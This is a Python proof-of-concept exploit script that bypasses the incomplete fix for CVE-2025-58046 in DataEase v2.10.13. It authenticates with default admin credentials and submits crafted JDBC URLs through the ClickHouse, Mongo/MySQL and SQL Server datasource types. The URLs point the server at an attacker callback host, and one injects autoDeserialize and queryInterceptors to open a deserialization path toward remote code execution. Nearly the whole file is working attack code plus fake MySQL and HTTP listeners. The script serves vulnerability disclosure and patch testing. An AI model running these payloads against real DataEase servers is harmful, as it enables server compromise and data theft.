#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : DataEase CVE-2025-58046 Fix Bypass (ClickHouse/SQLServer)
# CVE            : CVE-2025-58046
# Vendor         : DataEase / fit2cloud
# Product        : DataEase
# Affected       : v2.10.13 (patched for Impala, unpatched for CK/SQLServer)
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (Critical)
# Platform       : Java / Spring Boot
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-09-15
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Bypass PoC for CVE-2025-58046 fix — Incomplete Fix in DataEase v2.10.13

The fix for CVE-2025-58046 (commit 77078658) only patches Impala.java and Db2.java,
but the IDENTICAL vulnerability pattern (unvalidated JDBC URLs returned to the driver)
exists in multiple sibling datasource type classes that were NOT patched:

  1. CK.java (ClickHouse)  — No blocklist at all, returns custom JDBC URL unfiltered
  2. Sqlserver.java        — Has blocklist but it's DEAD CODE (never checked)
  3. Mongo.java            — Blocklist only checked in hostname path, not custom URL path
  4. Oracle.java           — No blocklist at all

This PoC demonstrates the bypass by exploiting these unpatched sibling datasource types
on a PATCHED DataEase v2.10.13 instance.

BYPASS VECTOR 1 — ClickHouse (CK):
  The ClickHouse JDBC driver uses HTTP as its transport protocol. When DataEase validates
  a ClickHouse datasource with a custom JDBC URL, the driver makes an HTTP POST request
  to the specified host. We detect this HTTP callback from the DataEase server, proving
  SSRF via the ClickHouse datasource type. No parameter injection is even needed —
  the JDBC URL itself IS the payload.

BYPASS VECTOR 2 — Mongo (MySQL JDBC driver):
  Mongo.java uses com.mysql.cj.jdbc.Driver but its custom URL path (urlType="jdbcUrl")
  returns getJdbcUrl() WITHOUT checking illegalParameters. This allows injection of
  dangerous MySQL JDBC parameters like:
    - autoDeserialize=true (Java object deserialization from result sets → RCE)
    - allowLoadLocalInfile=true (arbitrary file read via fake MySQL server)
  These parameters ARE in Mongo's blocklist but the blocklist is dead code in this path.

BYPASS VECTOR 3 — SQL Server:
  Sqlserver.java has an illegalParameters blocklist but getJdbc() NEVER checks it —
  identical to the pre-fix Impala.java vulnerability. Custom JDBC URLs and hostname
  extraParams are returned unfiltered.

Usage:
  python3 bypass_poc.py <target_host> <target_port> <callback_host>

Dependencies:
  pip install pycryptodome
"""

import sys
import json
import base64
import socket
import struct
import threading
import time
import urllib.request
import urllib.error
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============================================================================
# Configuration
# ============================================================================

DEFAULT_TARGET_HOST = "172.25.0.5"  # Patched v2.10.13
DEFAULT_TARGET_PORT = 8100
DEFAULT_CALLBACK_HOST = "172.25.0.4"

DE_USERNAME = "admin"
DE_PASSWORD = "DataEase@123456"

# Callback server ports — using different ports from original PoC to avoid conflicts
CK_HTTP_PORT = 9080       # ClickHouse HTTP callback listener
MONGO_TCP_PORT = 9306     # Fake MySQL server for Mongo bypass
SQLSERVER_TCP_PORT = 9433 # TCP listener for SQL Server bypass

HTTP_TIMEOUT = 15
CALLBACK_WAIT_TIMEOUT = 20

# ============================================================================
# Crypto helpers (reused from original PoC)
# ============================================================================

def decrypt_aes_key_and_pubkey(dekey_response):
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    separator = "LXBrX3NlcGFyYXRvci0="
    if separator not in dekey_response:
        raise ValueError(f"Separator not found in dekey response")
    parts = dekey_response.split(separator)
    encrypted_pubkey_b64 = parts[0]
    aes_key_str = parts[1]
    aes_key = aes_key_str.encode('utf-8')[:16]
    iv = b'0000000000000000'
    encrypted_pubkey = base64.b64decode(encrypted_pubkey_b64)
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(encrypted_pubkey), AES.block_size)
    return decrypted.decode('utf-8')


def rsa_encrypt(plaintext, pubkey_b64):
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    pubkey_der = base64.b64decode(pubkey_b64)
    key = RSA.import_key(pubkey_der)
    cipher = PKCS1_v1_5.new(key)
    encrypted = cipher.encrypt(plaintext.encode('utf-8'))
    return base64.b64encode(encrypted).decode('utf-8')


# ============================================================================
# HTTP client helpers
# ============================================================================

def http_request(url, data=None, headers=None, method=None):
    if headers is None:
        headers = {}
    if data is not None and isinstance(data, (dict, list)):
        data = json.dumps(data).encode('utf-8')
        headers.setdefault('Content-Type', 'application/json')
    elif data is not None and isinstance(data, str):
        data = data.encode('utf-8')

    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT) as resp:
            body = resp.read().decode('utf-8')
            return json.loads(body) if body else {}
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='replace')
        try:
            return json.loads(body)
        except:
            return {"error": body, "status": e.code}
    except Exception as e:
        return {"error": str(e)}


def authenticate(target_host, target_port):
    base_url = f"http://{target_host}:{target_port}"
    print("[*] Authenticating to DataEase...")

    resp = http_request(f"{base_url}/de2api/dekey")
    if resp.get("code") != 0 or "data" not in resp:
        print(f"[-] Failed to get dekey: {resp}")
        return None

    dekey_data = resp["data"]
    pubkey_b64 = decrypt_aes_key_and_pubkey(dekey_data)

    enc_username = rsa_encrypt(DE_USERNAME, pubkey_b64)
    enc_password = rsa_encrypt(DE_PASSWORD, pubkey_b64)

    login_data = {"name": enc_username, "pwd": enc_password}
    resp = http_request(f"{base_url}/de2api/login/localLogin", data=login_data)

    if resp.get("code") != 0 or "data" not in resp:
        print(f"[-] Login failed: {resp}")
        return None

    token = resp["data"].get("token")
    if not token:
        print(f"[-] No token in login response")
        return None

    print(f"[+] Authenticated. Token: {token[:30]}...")
    return token


# ============================================================================
# Callback trackers and servers
# ============================================================================

class BypassCallbackTracker:
    def __init__(self):
        self.callbacks = {}  # keyed by bypass name
        self.lock = threading.Lock()

    def add(self, name, client_addr, data=None, path=None, user_agent=None):
        with self.lock:
            if name not in self.callbacks:
                self.callbacks[name] = []
            self.callbacks[name].append({
                "time": time.time(),
                "client": client_addr,
                "data": data,
                "path": path,
                "user_agent": user_agent
            })

    def got(self, name):
        with self.lock:
            return name in self.callbacks and len(self.callbacks[name]) > 0

    def get_callbacks(self, name):
        with self.lock:
            return self.callbacks.get(name, [])


tracker = BypassCallbackTracker()


class ClickHouseCallbackHandler(BaseHTTPRequestHandler):
    """
    The ClickHouse JDBC driver uses HTTP as transport.
    When it connects to our fake server, it sends an HTTP POST.
    This callback proves SSRF via the CK datasource type.
    """
    def do_POST(self):
        global tracker
        client_addr = f"{self.client_address[0]}:{self.client_address[1]}"
        ua = self.headers.get('User-Agent', 'N/A')
        print(f"\n    [!] *** CLICKHOUSE HTTP CALLBACK RECEIVED ***")
        print(f"    [!] Client: {client_addr}")
        print(f"    [!] Path: {self.path}")
        print(f"    [!] User-Agent: {ua}")
        tracker.add("ck", client_addr, path=self.path, user_agent=ua)
        # Return a ClickHouse-like error response
        resp = b'Code: 81. DB::Exception: Database `default` does not exist. (UNKNOWN_DATABASE)\n'
        self.send_response(404)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', str(len(resp)))
        self.end_headers()
        self.wfile.write(resp)

    def do_GET(self):
        global tracker
        client_addr = f"{self.client_address[0]}:{self.client_address[1]}"
        ua = self.headers.get('User-Agent', 'N/A')
        print(f"\n    [!] *** CLICKHOUSE HTTP CALLBACK (GET) RECEIVED ***")
        print(f"    [!] Client: {client_addr}")
        print(f"    [!] User-Agent: {ua}")
        tracker.add("ck", client_addr, path=self.path, user_agent=ua)
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'Ok.\n')

    def log_message(self, format, *args):
        pass


def start_tcp_listener(name, port):
    """Start a generic TCP listener that detects incoming connections."""
    def listener():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(CALLBACK_WAIT_TIMEOUT + 10)
        try:
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            while True:
                try:
                    conn, addr = sock.accept()
                    client_addr = f"{addr[0]}:{addr[1]}"
                    data = b""
                    conn.settimeout(3)
                    try:
                        data = conn.recv(4096)
                    except socket.timeout:
                        pass
                    print(f"\n    [!] *** {name.upper()} TCP CALLBACK RECEIVED ***")
                    print(f"    [!] Client: {client_addr}")
                    print(f"    [!] Data: {len(data)} bytes")
                    if data:
                        print(f"    [!] Data (hex first 32): {data[:32].hex()}")
                    tracker.add(name, client_addr, data=data)

                    # For MySQL fake server, send a minimal handshake to keep connection alive
                    if name == "mongo":
                        try:
                            # MySQL protocol initial handshake packet (minimal)
                            # This makes the MySQL connector proceed further, proving the connection
                            greeting = build_mysql_greeting()
                            conn.sendall(greeting)
                            # Read the client's auth response
                            try:
                                auth_data = conn.recv(4096)
                                if auth_data:
                                    print(f"    [!] MySQL auth response: {len(auth_data)} bytes")
                            except:
                                pass
                        except:
                            pass

                    try:
                        conn.close()
                    except:
                        pass
                except socket.timeout:
                    break
                except Exception as e:
                    if "Address already in use" not in str(e):
                        break
        finally:
            sock.close()

    thread = threading.Thread(target=listener, daemon=True)
    thread.start()
    return thread


def build_mysql_greeting():
    """Build a minimal MySQL protocol greeting packet to keep the driver connected."""
    # Protocol version 10, server version, connection id, auth data, capabilities
    server_version = b"5.7.99-fake\x00"
    connection_id = struct.pack('<I', 1)
    auth_plugin_data_part_1 = b"\x01\x02\x03\x04\x05\x06\x07\x08"
    filler = b"\x00"
    # Capability flags (basic set)
    cap_lower = struct.pack('<H', 0xFFFF)
    charset = b"\x21"  # utf8
    status = struct.pack('<H', 0x0002)
    cap_upper = struct.pack('<H', 0x807F)
    auth_data_len = b"\x15"  # 21 bytes total auth data
    reserved = b"\x00" * 10
    auth_plugin_data_part_2 = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x00"
    auth_plugin_name = b"mysql_native_password\x00"

    payload = (b"\x0a" + server_version + connection_id +
               auth_plugin_data_part_1 + filler +
               cap_lower + charset + status + cap_upper +
               auth_data_len + reserved +
               auth_plugin_data_part_2 + auth_plugin_name)

    # Packet header: 3 bytes length + 1 byte sequence number
    packet_len = struct.pack('<I', len(payload))[:3]
    seq = b"\x00"
    return packet_len + seq + payload


# ============================================================================
# Bypass payload senders
# ============================================================================

def send_impala_payload(base_url, token, callback_host):
    """
    Test 0: Verify the original Impala exploit is BLOCKED on the patched container.
    This confirms the fix works for Impala, establishing our baseline.
    """
    config = {
        "urlType": "jdbcUrl",
        "jdbcUrl": f"jdbc:impala://{callback_host}:21050/default;AuthMech=1;KrbRealm=EXPLOIT.LOCAL;KrbHostFQDN=impala.exploit.local;KrbServiceName=impala;krbJAASFile=http://{callback_host}:{CK_HTTP_PORT}/impala_jaas.conf",
        "host": callback_host,
        "port": 21050,
        "dataBase": "default",
        "extraParams": "",
        "username": "",
        "password": ""
    }
    config_b64 = base64.b64encode(json.dumps(config).encode()).decode()
    payload = {"name": "bypass-impala-test", "type": "impala", "configuration": config_b64}
    headers = {"Content-Type": "application/json", "X-DE-TOKEN": token}

    resp = http_request(f"{base_url}/de2api/datasource/validate", data=payload, headers=headers)
    return resp


def send_ck_bypass_payload(base_url, token, callback_host):
    """
    BYPASS VECTOR 1: ClickHouse (CK) datasource type.

    CK.java has NO illegalParameters blocklist at all. The custom JDBC URL path returns
    getJdbcUrl() after only checking startsWith("jdbc:clickhouse").

    The ClickHouse JDBC driver uses HTTP as transport, so it will make an HTTP request
    to our callback server, proving SSRF.

    Code path in CK.java (v2.10.13, UNPATCHED):
      if (StringUtils.isNoneEmpty(getUrlType()) && !getUrlType().equalsIgnoreCase("hostName")) {
          if (!getJdbcUrl().startsWith("jdbc:clickhouse")) {
              DEException.throwException("Illegal jdbcUrl: " + getJdbcUrl());
          }
          return getJdbcUrl();  // <-- NO blocklist check, returns raw URL
      }
    """
    config = {
        "urlType": "jdbcUrl",
        "jdbcUrl": f"jdbc:clickhouse://{callback_host}:{CK_HTTP_PORT}/default",
        "host": callback_host,
        "port": CK_HTTP_PORT,
        "dataBase": "default",
        "extraParams": "",
        "username": "",
        "password": ""
    }
    config_b64 = base64.b64encode(json.dumps(config).encode()).decode()
    payload = {"name": "bypass-ck-test", "type": "ck", "configuration": config_b64}
    headers = {"Content-Type": "application/json", "X-DE-TOKEN": token}

    resp = http_request(f"{base_url}/de2api/datasource/validate", data=payload, headers=headers)
    return resp


def send_mongo_bypass_payload(base_url, token, callback_host):
    """
    BYPASS VECTOR 2: Mongo datasource type with MySQL JDBC autoDeserialize injection.

    Mongo.java uses com.mysql.cj.jdbc.Driver (MySQL Connector/J) but its custom URL path
    does NOT check illegalParameters. The blocklist (which includes 'autoDeserialize') is
    only checked in the hostname+extraParams path.

    Custom URL path in Mongo.java (v2.10.13, UNPATCHED):
      if (StringUtils.isNoneEmpty(getUrlType()) && !getUrlType().equalsIgnoreCase("hostName")) {
          if (!getJdbcUrl().startsWith("jdbc:mysql")) {
              DEException.throwException("Illegal jdbcUrl: " + getJdbcUrl());
          }
          return getJdbcUrl();  // <-- blocklist NOT checked! autoDeserialize passes!
      }

    Injected parameters:
      - autoDeserialize=true: Tells MySQL Connector/J to deserialize Java objects from
        BLOB/TEXT columns. Combined with a fake MySQL server that returns crafted serialized
        objects, this achieves Java deserialization → RCE.
      - queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor:
        Triggers a "SHOW SESSION STATUS" query on connection, creating an opportunity
        for the fake MySQL server to return malicious deserialized data.

    For this PoC, we detect the MySQL TCP connection from DataEase, proving the injected
    parameters are accepted by the driver.
    """
    config = {
        "urlType": "jdbcUrl",
        "jdbcUrl": f"jdbc:mysql://{callback_host}:{MONGO_TCP_PORT}/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&connectTimeout=5000&socketTimeout=5000",
        "host": callback_host,
        "port": MONGO_TCP_PORT,
        "dataBase": "test",
        "extraParams": "",
        "username": "",
        "password": ""
    }
    config_b64 = base64.b64encode(json.dumps(config).encode()).decode()
    payload = {"name": "bypass-mongo-test", "type": "mongo", "configuration": config_b64}
    headers = {"Content-Type": "application/json", "X-DE-TOKEN": token}

    resp = http_request(f"{base_url}/de2api/datasource/validate", data=payload, headers=headers)
    return resp


def send_sqlserver_bypass_payload(base_url, token, callback_host):
    """
    BYPASS VECTOR 3: SQL Server datasource type.

    Sqlserver.java has an illegalParameters blocklist but getJdbc() NEVER checks it —
    identical to pre-fix Impala.java. The custom JDBC URL path and hostname+extraParams
    path both return unvalidated URLs.

    Code in Sqlserver.java (v2.10.13, UNPATCHED):
      private List<String> illegalParameters = Arrays.asList(
          "autoDeserialize", "queryInterceptors", "statementInterceptors",
          "detectCustomCollations");  // <-- NEVER REFERENCED in getJdbc()

      public String getJdbc() {
          if (StringUtils.isNoneEmpty(getUrlType()) && !getUrlType().equalsIgnoreCase("hostName")) {
              if (!getJdbcUrl().startsWith("jdbc:sqlserver")) {
                  DEException.throwException("Illegal jdbcUrl: " + getJdbcUrl());
              }
              return getJdbcUrl();  // <-- blocklist is dead code!
          }
          ...
      }

    We point the JDBC URL to our TCP listener and detect the SQL Server TDS connection
    from DataEase.
    """
    config = {
        "urlType": "jdbcUrl",
        "jdbcUrl": f"jdbc:sqlserver://{callback_host}:{SQLSERVER_TCP_PORT};DatabaseName=master;loginTimeout=5",
        "host": callback_host,
        "port": SQLSERVER_TCP_PORT,
        "dataBase": "master",
        "extraParams": "",
        "username": "sa",
        "password": "test"
    }
    config_b64 = base64.b64encode(json.dumps(config).encode()).decode()
    payload = {"name": "bypass-sqlserver-test", "type": "sqlServer", "configuration": config_b64}
    headers = {"Content-Type": "application/json", "X-DE-TOKEN": token}

    resp = http_request(f"{base_url}/de2api/datasource/validate", data=payload, headers=headers)
    return resp


# ============================================================================
# Main bypass logic
# ============================================================================

def run_bypass(target_host, target_port, callback_host):
    global tracker
    base_url = f"http://{target_host}:{target_port}"

    print("=" * 74)
    print("  CVE-2025-58046 FIX BYPASS PoC")
    print("  Target (PATCHED v2.10.13): {}:{}".format(target_host, target_port))
    print("  Callback: {}".format(callback_host))
    print("=" * 74)

    # ---------------------------------------------------------------
    # Phase 1: Authenticate
    # ---------------------------------------------------------------
    print("\n" + "=" * 60)
    print("[*] PHASE 1: Authentication")
    print("=" * 60)

    token = authenticate(target_host, target_port)
    if not token:
        print("[-] FATAL: Cannot authenticate. Aborting.")
        return False

    # ---------------------------------------------------------------
    # Phase 2: Verify original Impala exploit is BLOCKED (baseline)
    # ---------------------------------------------------------------
    print("\n" + "=" * 60)
    print("[*] PHASE 2: Baseline — Verify Impala fix is effective")
    print("=" * 60)

    print("[*] Sending original Impala exploit to PATCHED container...")
    resp = send_impala_payload(base_url, token, callback_host)
    impala_msg = resp.get("msg", "")
    impala_blocked = "Illegal parameter" in impala_msg or "illegal" in impala_msg.lower()

    if impala_blocked:
        print(f"[+] GOOD: Impala exploit BLOCKED by fix!")
        print(f"[+] Server response: {impala_msg}")
    else:
        print(f"[!] WARNING: Impala exploit was NOT blocked. Response: {impala_msg}")
        print(f"[!] This may not be a patched instance!")

    # ---------------------------------------------------------------
    # Phase 3: Start callback servers for bypass tests
    # ---------------------------------------------------------------
    print("\n" + "=" * 60)
    print("[*] PHASE 3: Starting bypass callback servers")
    print("=" * 60)

    # ClickHouse HTTP callback server
    ck_server = HTTPServer(('0.0.0.0', CK_HTTP_PORT), ClickHouseCallbackHandler)
    ck_thread = threading.Thread(target=ck_server.serve_forever, daemon=True)
    ck_thread.start()
    print(f"[+] ClickHouse HTTP listener on 0.0.0.0:{CK_HTTP_PORT}")

    # Fake MySQL server for Mongo bypass
    mongo_thread = start_tcp_listener("mongo", MONGO_TCP_PORT)
    print(f"[+] Fake MySQL TCP listener on 0.0.0.0:{MONGO_TCP_PORT}")

    # TCP listener for SQL Server bypass
    sqlserver_thread = start_tcp_listener("sqlserver", SQLSERVER_TCP_PORT)
    print(f"[+] SQL Server TCP listener on 0.0.0.0:{SQLSERVER_TCP_PORT}")

    time.sleep(1)

    results = {}

    # ---------------------------------------------------------------
    # BYPASS VECTOR 1: ClickHouse (CK)
    # ---------------------------------------------------------------
    print("\n" + "=" * 60)
    print("[*] BYPASS VECTOR 1: ClickHouse (CK) — HTTP-based SSRF")
    print("[*] CK.java has NO blocklist. ClickHouse JDBC uses HTTP transport.")
    print("=" * 60)

    resp = send_ck_bypass_payload(base_url, token, callback_host)
    ck_msg = resp.get("msg", "")
    print(f"[*] Server response: {ck_msg[:200]}")

    # Wait for ClickHouse callback
    ck_start = time.time()
    while time.time() - ck_start < CALLBACK_WAIT_TIMEOUT:
        if tracker.got("ck"):
            break
        time.sleep(0.5)

    if tracker.got("ck"):
        cbs = tracker.get_callbacks("ck")
        print(f"\n[+] *** BYPASS SUCCESSFUL: ClickHouse HTTP callback received! ***")
        print(f"[+] The ClickHouse JDBC driver connected to our HTTP server.")
        for cb in cbs:
            print(f"[+]   From: {cb['client']}, Path: {cb['path']}, UA: {cb['user_agent']}")
        results["ck"] = "BYPASS_CONFIRMED"
    else:
        ck_blocked = "Illegal" in ck_msg or "illegal" in ck_msg.lower()
        if ck_blocked:
            print(f"[-] ClickHouse bypass was BLOCKED: {ck_msg}")
            results["ck"] = "BLOCKED"
        else:
            print(f"[-] No ClickHouse callback received. Response: {ck_msg}")
            results["ck"] = "NO_CALLBACK"

    # ---------------------------------------------------------------
    # BYPASS VECTOR 2: Mongo (MySQL JDBC autoDeserialize)
    # ---------------------------------------------------------------
    print("\n" + "=" * 60)
    print("[*] BYPASS VECTOR 2: Mongo — MySQL JDBC autoDeserialize injection")
    print("[*] Mongo.java custom URL path skips blocklist check.")
    print("=" * 60)

    resp = send_mongo_bypass_payload(base_url, token, callback_host)
    mongo_msg = resp.get("msg", "")
    print(f"[*] Server response: {mongo_msg[:200]}")

    mongo_start = time.time()
    while time.time() - mongo_start < CALLBACK_WAIT_TIMEOUT:
        if tracker.got("mongo"):
            break
        time.sleep(0.5)

    if tracker.got("mongo"):
        cbs = tracker.get_callbacks("mongo")
        print(f"\n[+] *** BYPASS SUCCESSFUL: MySQL TCP connection received (Mongo type)! ***")
        print(f"[+] The MySQL JDBC driver connected with injected autoDeserialize=true.")
        print(f"[+] In Mongo.java, the custom URL path does NOT check illegalParameters.")
        for cb in cbs:
            data_preview = cb['data'][:32].hex() if cb['data'] else "none"
            print(f"[+]   From: {cb['client']}, Data: {data_preview}")
        results["mongo"] = "BYPASS_CONFIRMED"
    else:
        mongo_blocked = "Illegal" in mongo_msg or "illegal" in mongo_msg.lower()
        if mongo_blocked:
            print(f"[-] Mongo bypass was BLOCKED: {mongo_msg}")
            results["mongo"] = "BLOCKED"
        else:
            print(f"[-] No Mongo/MySQL callback received. Response: {mongo_msg}")
            results["mongo"] = "NO_CALLBACK"

    # ---------------------------------------------------------------
    # BYPASS VECTOR 3: SQL Server
    # ---------------------------------------------------------------
    print("\n" + "=" * 60)
    print("[*] BYPASS VECTOR 3: SQL Server — Dead-code blocklist bypass")
    print("[*] Sqlserver.java has illegalParameters but never checks them.")
    print("=" * 60)

    resp = send_sqlserver_bypass_payload(base_url, token, callback_host)
    sqlserver_msg = resp.get("msg", "")
    print(f"[*] Server response: {sqlserver_msg[:200]}")

    sqlserver_start = time.time()
    while time.time() - sqlserver_start < CALLBACK_WAIT_TIMEOUT:
        if tracker.got("sqlserver"):
            break
        time.sleep(0.5)

    if tracker.got("sqlserver"):
        cbs = tracker.get_callbacks("sqlserver")
        print(f"\n[+] *** BYPASS SUCCESSFUL: SQL Server TCP connection received! ***")
        print(f"[+] The SQL Server JDBC driver connected to our listener.")
        print(f"[+] Sqlserver.java blocklist is dead code — never checked.")
        for cb in cbs:
            data_preview = cb['data'][:32].hex() if cb['data'] else "none"
            print(f"[+]   From: {cb['client']}, Data: {data_preview}")
        results["sqlserver"] = "BYPASS_CONFIRMED"
    else:
        sqlserver_blocked = "Illegal" in sqlserver_msg or "illegal" in sqlserver_msg.lower()
        if sqlserver_blocked:
            print(f"[-] SQL Server bypass was BLOCKED: {sqlserver_msg}")
            results["sqlserver"] = "BLOCKED"
        else:
            print(f"[-] No SQL Server callback received. Response: {sqlserver_msg}")
            results["sqlserver"] = "NO_CALLBACK"

    # ---------------------------------------------------------------
    # Final results
    # ---------------------------------------------------------------
    print("\n" + "=" * 74)
    print("  BYPASS RESULTS SUMMARY")
    print("=" * 74)

    print(f"\n  Baseline: Impala fix {'EFFECTIVE (blocked)' if impala_blocked else 'NOT EFFECTIVE (allowed!)'}")
    print()

    bypass_count = sum(1 for v in results.values() if v == "BYPASS_CONFIRMED")
    total = len(results)

    for name, result in results.items():
        labels = {
            "ck": "ClickHouse (CK.java)",
            "mongo": "Mongo (Mongo.java, MySQL driver)",
            "sqlserver": "SQL Server (Sqlserver.java)"
        }
        status = {
            "BYPASS_CONFIRMED": "[BYPASS CONFIRMED]",
            "BLOCKED": "[BLOCKED]",
            "NO_CALLBACK": "[NO CALLBACK]"
        }
        label = labels.get(name, name)
        s = status.get(result, result)
        print(f"  Vector: {label:45s} {s}")

    print()
    if bypass_count > 0:
        print(f"  VERDICT: FIX IS INCOMPLETE — {bypass_count}/{total} bypass vectors succeeded!")
        print(f"  The fix for CVE-2025-58046 only patches Impala.java and Db2.java, but")
        print(f"  the identical vulnerability pattern exists in {bypass_count} other datasource")
        print(f"  types that remain unpatched in v2.10.13.")
        print()
        print(f"  SEVERITY: CRITICAL — Same CVSS 9.8 attack surface remains exploitable")
        print(f"  via alternative datasource types (ClickHouse, Mongo/MySQL, SQL Server).")
        print(f"  An attacker only needs to change the 'type' field in the request body")
        print(f"  to bypass the fix entirely.")
    else:
        print(f"  VERDICT: Fix appears adequate — all bypass vectors failed.")

    print("=" * 74 + "\n")

    # Cleanup
    ck_server.shutdown()
    return bypass_count > 0


if __name__ == '__main__':
    target_host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET_HOST
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_TARGET_PORT
    callback_host = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_CALLBACK_HOST

    success = run_bypass(target_host, target_port, callback_host)
    sys.exit(0 if success else 1)
